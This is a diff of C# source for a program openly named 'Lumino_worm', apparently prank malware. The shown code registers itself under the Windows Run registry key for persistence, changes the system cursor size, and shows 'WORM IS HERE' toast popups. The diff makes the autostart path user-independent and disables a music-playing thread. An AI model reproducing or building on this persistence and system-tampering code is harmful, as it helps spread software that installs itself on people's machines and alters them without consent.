@@ -107,7 +107,7 @@ namespace Lumino_worm
                 RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(
        @"Software\Microsoft\Windows\CurrentVersion\Run");
                 objRegistryKey.GetValue("LuminoWorm");
-                objRegistryKey.SetValue("Lumino", "C:\\Users\\lumin\\Music\\Lumino_worm.exe", RegistryValueKind.String);
+                objRegistryKey.SetValue("Lumino", "%USERPROFILE%\\Music\\Lumino_worm.exe", RegistryValueKind.String);
 
                 objRegistryKey.Close();
             }
@@ -139,13 +139,13 @@ namespace Lumino_worm
             int cursorSize = Int32.Parse(cbCursorSize);
             string user_dir = @"C:\Users\" + userName;
             int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
-            Enum Music = new Enum();
-            Thread Music_play = new Thread(Music.Enum_music);
+            //Enum Music = new Enum();                            |
+            //Thread Music_play = new Thread(Music.Enum_music);   | PLUS DE MUSIQUE !
             TaskICO Icon = new TaskICO();
             Thread Icon_Active = new Thread(Icon.Show);
             Thread Notify_Icon = new Thread(notify.Notify_popup);
             Icon_Active.Start();
-            Music_play.Start();
+            // Music_play.Start();
             Notify_Icon.Start();
             SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
             StartOnWinStartup();
@@ -233,7 +233,7 @@ namespace Lumino_worm
             string path = Resources.logo_LS.ToString();
             new ToastContentBuilder()
                 .AddText("WORM IS HERE")
-    .AddText("LUMINE IS HERE!")
+    .AddText("LUMINO IS HERE!")
     .Show();
 
             Thread.Sleep(32000);
@@ -245,7 +245,8 @@ namespace Lumino_worm
     }
     public class Enum
     {
-
+        /* AFIN D'ÉVITEZ LA NECESSITER DES MUSIQUES !
+        
         public void Enum_music()
         {
 
@@ -318,5 +319,9 @@ namespace Lumino_worm
         System.Media.SoundPlayer player3 = new System.Media.SoundPlayer(Resources.Sea_Chanty);
         System.Media.SoundPlayer player2 = new System.Media.SoundPlayer(Resources.Adele);
         System.Media.SoundPlayer player1 = new System.Media.SoundPlayer(Resources.believer);
+    */
+    
     }
+    
 }
+
